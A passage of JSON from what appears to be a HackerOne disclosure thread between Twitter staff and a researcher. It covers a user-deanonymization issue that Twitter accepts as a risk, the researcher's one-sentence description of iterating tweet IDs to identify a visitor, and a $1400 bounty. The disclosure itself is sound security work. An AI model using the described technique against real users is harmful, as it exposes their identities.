before marking this all fixed.","markdown_message":"\u003cp\u003esure thing. you need to \u0026#39;request public disclosure\u0026#39; in here when we mark the issue resolved, and we\u0026#39;d be happy to oblige. could you give us a little time to look into the second issue that you mention here with the username deanonymization? we want to respond to that as well before marking this all fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-23T20:16:03.977Z","updated_at":"2015-02-23T20:16:03.977Z","actor":{"username":"jimio","cleared":false,"url":"/jimio","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/734/78744d51291d123ab5043159d56fd0f228b782b3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":339449,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"regarding the second user deanonymization attack that you’ve described: we talked it over a bit more internally, and there are several factors that play into when the window is automatically closed. favorites and retweets and following are all a part of it, but there’s more to that behind the scenes.\n\ncombining this with the user interaction required to repeatedly invoke a window.open() on this endpoint, we think that it’s an acceptable risk to leave the behavior as it is today. we’re not saying it’s technically impossible (as evidenced by your PoC), but that it’s more beneficial to let all users return cleanly back to the page that invoked the action rather than always leaving a window lingering around to prevent this particular threat.\n\nthanks again!\n","markdown_message":"\u003cp\u003eregarding the second user deanonymization attack that you’ve described: we talked it over a bit more internally, and there are several factors that play into when the window is automatically closed. favorites and retweets and following are all a part of it, but there’s more to that behind the scenes.\u003c/p\u003e\n\n\u003cp\u003ecombining this with the user interaction required to repeatedly invoke a window.open() on this endpoint, we think that it’s an acceptable risk to leave the behavior as it is today. we’re not saying it’s technically impossible (as evidenced by your PoC), but that it’s more beneficial to let all users return cleanly back to the page that invoked the action rather than always leaving a window lingering around to prevent this particular threat.\u003c/p\u003e\n\n\u003cp\u003ethanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-24T21:03:28.775Z","updated_at":"2015-02-24T21:03:28.775Z","actor":{"username":"jimio","cleared":false,"url":"/jimio","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/734/78744d51291d123ab5043159d56fd0f228b782b3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"homakov","url":"/homakov"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":339454,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can agree on that however I don't need to make user click every time, i can simply iterate tweet IDs until the window is closed (user follows \u0026 favorited this tweet) which in some cases can be enough to detect who the user is. ","markdown_message":"\u003cp\u003eI can agree on that however I don\u0026#39;t need to make user click every time, i can simply iterate tweet IDs until the window is closed (user follows \u0026amp; favorited this tweet) which in some cases can be enough to detect who the user is. \u003c/p\u003e\n","automated_response":false,"created_at":"2015-02-24T21:13:07.068Z","updated_at":"2015-02-24T21:13:07.068Z","actor":{"username":"homakov","cleared":false,"url":"/homakov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/182/88285f48615cb1af0146adb653ab45d18b47ad96_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":339455,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-02-24T21:13:44.509Z","updated_at":"2015-02-24T21:13:44.509Z","first_to_agree":true,"actor":{"username":"homakov","cleared":false,"url":"/homakov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/182/88285f48615cb1af0146adb653ab45d18b47ad96_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":339520,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-02-24T21:55:21.451Z","updated_at":"2015-02-24T21:55:21.451Z","actor":{"username":"jimio","cleared":false,"url":"/jimio","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/734/78744d51291d123ab5043159d56fd0f228b782b3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":339521,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-02-24T21:55:21.959Z","updated_at":"2015-02-24T21:55:21.959Z","actor":{"username":"jimio","cleared":false,"url":"/jimio","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/734/78744d51291d123ab5043159d56fd0f228b782b3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":343792,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"is it bounty-ble?","markdown_message":"\u003cp\u003eis it bounty-ble?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-03-01T18:56:36.846Z","updated_at":"2015-03-01T18:56:36.846Z","actor":{"username":"homakov","cleared":false,"url":"/homakov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/182/88285f48615cb1af0146adb653ab45d18b47ad96_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":343798,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Not sure why this didn't go out Friday, but here you go.  Thanks for helping Twitter security!","markdown_message":"\u003cp\u003eNot sure why this didn\u0026#39;t go out Friday, but here you go.  Thanks for helping Twitter security!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-03-01T19:03:50.542Z","updated_at":"2015-03-01T19:03:50.542Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"bounty_amount":"1400.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"homakov","url":"/homakov"},"actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}